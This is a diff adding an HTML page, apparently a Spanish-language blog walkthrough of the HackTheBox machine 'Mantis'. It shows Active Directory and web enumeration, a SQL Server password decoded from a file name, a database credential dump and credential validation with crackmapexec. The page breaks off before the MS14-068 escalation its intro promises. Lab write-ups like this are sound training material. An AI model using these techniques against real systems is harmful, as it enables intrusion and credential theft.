@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Mantis (hard) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Mantis (hard)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolucion de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/hard/2024/04/04/mantis.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/hard/2024/04/04/mantis.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-04T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Mantis (hard)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-04T00:00:00-06:00","datePublished":"2024-04-04T00:00:00-06:00","description":"Posts sobre resolucion de CTFs y ciberseguridad.","headline":"HackTheBox - Mantis (hard)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/hard/2024/04/04/mantis.html"},"url":"http://localhost:4000/hackthebox/machines/hard/2024/04/04/mantis.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Mantis (hard)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-04T00:00:00-06:00" itemprop="datePublished">
+        Apr 4, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/b5e2f52942b3665497cd1b40ae7207f0.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a hacer la maquina Mantis de la plataforma de Hackthebox donde vamos a estar encontrando una ruta en un servicio web donde nos darán credenciales para conectarnos a una base de datos al conectarnos encontraremos credenciales de un usuario para poder conectarnos con evil-winrm para la escalada de privilegios usaremos goldenPac.py para conectarnos con las credenciales de un usuario el cual estaremos como nt authority system gracias a la vulnerabilidad  MS14-068.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.129.116.149
+PING 10.129.116.149 <span class="o">(</span>10.129.116.149<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.129.116.149: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>156 ms
+
+<span class="nt">---</span> 10.129.116.149 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 156.286/156.286/156.286/0.000 ms
+❯ whichSystem.py 10.129.116.149
+
+10.129.116.149 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">PortScan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,389,445,464,593,636,1337,1433,3268,3269,5722,8080,9389,47001,49152,49153,49154,49155,49157,49158,49166,49170,49188,50255 10.129.116.149 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-28 12:14 CST
+Nmap scan report <span class="k">for </span>10.129.116.149
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15CD4<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15CD4<span class="o">)</span>
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-07-28 18:14:34Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds <span class="o">(</span>workgroup: HTB<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+1337/tcp  open  http         Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00<span class="p">;</span> RTM
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2023-07-28T18:08:35
+|_Not valid after:  2053-07-28T18:08:35
+|_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ms-sql-ntlm-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ssl-date: 2023-07-28T18:15:44+00:00<span class="p">;</span> <span class="nt">-2s</span> from scanner time.
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: htb.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc        Microsoft Windows RPC
+8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Tossed Salad - Blog
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc        Microsoft Windows RPC
+49166/tcp open  msrpc        Microsoft Windows RPC
+49170/tcp open  msrpc        Microsoft Windows RPC
+49188/tcp open  msrpc        Microsoft Windows RPC
+50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00<span class="p">;</span> RTM
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2023-07-28T18:08:35
+|_Not valid after:  2053-07-28T18:08:35
+|_ssl-date: 2023-07-28T18:15:44+00:00<span class="p">;</span> <span class="nt">-2s</span> from scanner time.
+|_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ms-sql-ntlm-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+Service Info: Host: MANTIS<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-07-28T18:15:33
+|_  start_date: 2023-07-28T18:08:28
+| smb-os-discovery: 
+|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 <span class="o">(</span>Windows Server 2008 R2 Standard 6.1<span class="o">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
+|   Computer name: mantis
+|   NetBIOS computer name: MANTIS<span class="se">\x</span>00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: mantis.htb.local
+|_  System <span class="nb">time</span>: 2023-07-28T14:15:32-04:00
+|_clock-skew: mean: 47m57s, deviation: 1h47m20s, median: <span class="nt">-2s</span>
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled and required
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+</code></pre></div></div>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<ul>
+  <li>Vemos muchos puertos abiertos entre ellos <code class="language-plaintext highlighter-rouge">mysql</code> , <code class="language-plaintext highlighter-rouge">kerberos</code> <code class="language-plaintext highlighter-rouge">http</code> y demás pero vamos a comenzar viendo ante que estamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.129.116.149
+SMB         10.129.116.149  445    MANTIS           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 <span class="o">(</span>name:MANTIS<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a agregar el dominio al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.129.116.149 mantis.htb mantis.htb.local htb.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+10.129.116.149 mantis.htb mantis.htb.local htb.local
+</code></pre></div></div>
+
+<ul>
+  <li>De momento no vemos ningún recurso compartido por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.129.116.149 <span class="nt">-N</span>
+Anonymous login successful
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina <code class="language-plaintext highlighter-rouge">web</code> que esta corriendo en el puerto <code class="language-plaintext highlighter-rouge">8080</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/mantis/web1.png" />
+</p>
+
+<ul>
+  <li>Estas son las tecnologías que esta corriendo el servicio web.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.149</span><span class="p">:</span><span class="mi">8080</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.149</span><span class="p">:</span><span class="mi">8080</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">ASP_NET</span><span class="p">[</span><span class="mf">4.0</span><span class="o">.</span><span class="mi">30319</span><span class="p">][</span><span class="no">MVC5</span><span class="o">.</span><span class="mi">2</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">7.5</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">116.149</span><span class="p">],</span> <span class="no">MetaGenerator</span><span class="p">[</span><span class="no">Orchard</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">7.5</span><span class="p">],</span> <span class="no">Script</span><span class="p">[</span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Tossed</span> <span class="no">Salad</span> <span class="o">-</span> <span class="no">Blog</span><span class="p">],</span> <span class="no">UncommonHeaders</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="n">generator</span><span class="p">,</span><span class="n">x</span><span class="o">-</span><span class="n">aspnetmvc</span><span class="o">-</span><span class="n">version</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>También tenemos este puerto abierto que es <code class="language-plaintext highlighter-rouge">http</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/mantis/web2.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Pero bueno como es un entorno de <strong>Active Directory</strong> podemos usar <code class="language-plaintext highlighter-rouge">kerbrute</code> y usar un diccionario de <code class="language-plaintext highlighter-rouge">seclists</code> para enumerar usuarios validos si es que hay para que en caso de encontrar usuarios validos probar un <code class="language-plaintext highlighter-rouge">ASREPRoast Attack</code>.</p>
+  </li>
+  <li>
+    <p>Primero necesitamos <code class="language-plaintext highlighter-rouge">kerbrute</code> <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a>.</p>
+  </li>
+  <li>
+    <p>Encontramos que existen estos usuarios.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./kerbrute userenum <span class="nt">-d</span> htb.local <span class="nt">--dc</span> mantis.htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
+
+Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 07/28/23 - Ronnie Flathers @ropnop
+
+2023/07/28 12:32:45 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
+2023/07/28 12:32:45 <span class="o">&gt;</span>  	mantis.htb.local:88
+
+2023/07/28 12:32:46 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	james@htb.local
+2023/07/28 12:32:52 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	James@htb.local
+2023/07/28 12:33:16 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	administrator@htb.local
+2023/07/28 12:33:39 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	mantis@htb.local
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a añadirlo a una lista para poder emplear <code class="language-plaintext highlighter-rouge">GetNPUsers</code> pero ningún usuario es vulnerable a este ataque.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetNPUsers.py htb.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> <span class="nb">users
+</span>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span>-] User james doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+<span class="o">[</span>-] User mantis doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
+</span></code></pre></div></div>
+
+<ul>
+  <li>Si probamos conectándonos con <code class="language-plaintext highlighter-rouge">rpcclient</code> vemos que no funciona emplear un <code class="language-plaintext highlighter-rouge">Null Session</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.129.116.149 <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span>
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient <span class="nv">$&gt;</span> 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a aplicar <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos directorios en el servicio <strong>web</strong> que corre en el puerto <code class="language-plaintext highlighter-rouge">1337</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.129.116.149:1337 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.129.116.149:1337
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 80
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2023/07/28 12:47:42 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/orchard              <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 3026]
+/secure_notes         <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 163] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.116.149:1337/secure_notes/]
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos esto en la ruta <code class="language-plaintext highlighter-rouge">orchard</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/mantis/web3.png" />
+</p>
+
+<ul>
+  <li>Y ya vemos esto interesante en <code class="language-plaintext highlighter-rouge">secure_notes</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/mantis/web4.png" />
+</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">web.config</code> nos da un error.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/mantis/web5.png" />
+</p>
+
+<ul>
+  <li>Aquí ya vemos que nos están dando información sobre <code class="language-plaintext highlighter-rouge">SQL Server</code> que el puerto como tal esta abierto.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/mantis/web6.png" />
+</p>
+
+<ul>
+  <li>Si nos fijamos en el nombre del archivo vemos que esta en <code class="language-plaintext highlighter-rouge">base64</code> a si que vamos aplicar un <code class="language-plaintext highlighter-rouge">decode</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx"</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
+</span>6d2424716c5f53405f504073735730726421
+</code></pre></div></div>
+
+<ul>
+  <li>Y nos devuelve una cadena en <code class="language-plaintext highlighter-rouge">hexadecimal</code> y al final una contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"6d2424716c5f53405f504073735730726421"</span> | xxd <span class="nt">-ps</span> <span class="nt">-r</span><span class="p">;</span> <span class="nb">echo
+</span>m<span class="nv">$$</span>ql_S@_P@ssW0rd!
+</code></pre></div></div>
+
+<h2 id="mssqlclient-admin">mssqlclient admin</h2>
+
+<ul>
+  <li>Si revisamos en las notas nos dicen que el usuario es <code class="language-plaintext highlighter-rouge">admin</code> que lo mas probable es que esa base de datos que nos piden crear ya esta creada y como tal tenemos una contraseña a si que nos podemos conectar con  <code class="language-plaintext highlighter-rouge">mssqlclient.py</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-mssqlclient htb.local/admin:<span class="s1">'m$$ql_S@_P@ssW0rd!'</span>@mantis.htb.local
+Impacket v0.10.1.dev1+20230207.122134.c812d6c7 - Copyright 2022 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>MANTIS<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>MANTIS<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>120 7208<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a enumerar las bases de datos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; <span class="k">select </span>name from sysdatabases<span class="p">;</span>
+name                                                                                                                           <span class="o">&gt;</span>
+
+<span class="nt">-------------------------------------------------------------------------------------------------------------------------------</span><span class="o">&gt;</span>
+
+master                                                                                                                         <span class="o">&gt;</span>
+
+tempdb                                                                                                                         <span class="o">&gt;</span>
+
+model                                                                                                                          <span class="o">&gt;</span>
+
+msdb                                                                                                                           <span class="o">&gt;</span>
+
+orcharddb                                                                                                                      <span class="o">&gt;</span>
+
+SQL&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar la base de datos <code class="language-plaintext highlighter-rouge">orcharddb</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; use orcharddb<span class="p">;</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: orcharddb
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>MANTIS<span class="se">\S</span>QLEXPRESS<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'orcharddb'</span><span class="nb">.</span>
+SQL&gt; 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a enumerar las tablas para esa base de datos filtrando directamente por alguna que contenga la palabra <code class="language-plaintext highlighter-rouge">user</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; <span class="k">select </span>name from sys.tables where name like <span class="s1">'%user%'</span><span class="p">;</span>
+name                                                                                                                           <span class="o">&gt;</span>
+
+<span class="nt">-------------------------------------------------------------------------------------------------------------------------------</span><span class="o">&gt;</span>
+
+blog_Orchard_Users_UserPartRecord                                                                                              <span class="o">&gt;</span>
+
+blog_Orchard_Roles_UserRolesPartRecord    
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora listamos las columnas de las tablas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; <span class="k">select </span>name from sys.columns where object_id <span class="o">=</span> object_id<span class="o">(</span><span class="s1">'blog_Orchard_Users_UserPartRecord'</span><span class="o">)</span><span class="p">;</span>  
+
+name
+<span class="nt">--------------------------------------------------------------------------</span>
+
+Id
+UserName
+Email
+NormalizedUserName
+Password
+PasswordFormat
+HashAlgorithm
+PasswordSalt
+RegistrationStatus
+EmailStatus
+EmailChallengeToken
+CreatedUtc
+LastLoginUtc
+LastLogoutUtc
+
+SQL&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora vamos a leer el contenido de estas columnas interesantes y tenemos las contraseñas y la de <code class="language-plaintext highlighter-rouge">admin</code> esta en <code class="language-plaintext highlighter-rouge">base64</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; <span class="k">select </span>username,password from blog_Orchard_Users_UserPartRecord
+
+username                          password
+<span class="nt">---------------------------------</span> <span class="nt">----------------------------------------------------------------------</span>  
+
+admin                              AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A<span class="o">==</span>
+James                              J@m3s_P@ssW0rd!
+
+SQL&gt;
+</code></pre></div></div>
+
+<h2 id="shell-as-administrator">Shell as administrator</h2>
+
+<ul>
+  <li>Ahora vemos que las credenciales sean correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb mantis.htb.local <span class="nt">-u</span> James <span class="nt">-p</span> J@m3s_P@ssW0rd!
+SMB         mantis.htb      445    MANTIS           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 <span class="o">(</span>name:MANTIS<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         mantis.htb      445    MANTIS           <span class="o">[</span>+] htb.local<span class="se">\J</span>ames:J@m3s_P@ssW0rd!
+</code></pre></div></div>
+
+<ul>
+  <li>Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> también podemos verificar si un usuario pertenece a un grupo en este caso este es de interés.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb mantis.htb.local <span class="nt">-u</span> James <span class="nt">-p</span> J@m3s_P@ssW0rd! <span class="nt">--groups</span> <span class="s1">'Remote Desktop Users'</span>
+SMB         mantis.htb      445    MANTIS           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 <span class="o">(</span>name:MANTIS<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         mantis.htb      445    MANTIS           <span class="o">[</span>+] htb.local<span class="se">\J</span>ames:J@m3s_P@ssW0rd! 
+SMB         mantis.htb      445    MANTIS           <span class="o">[</span>+] Enumerated members of domain group
+SMB         mantis.htb      445    MANTIS           htb.local<span class="se">\j</span>ames
+</code></pre></div></div>
+
+<ul>
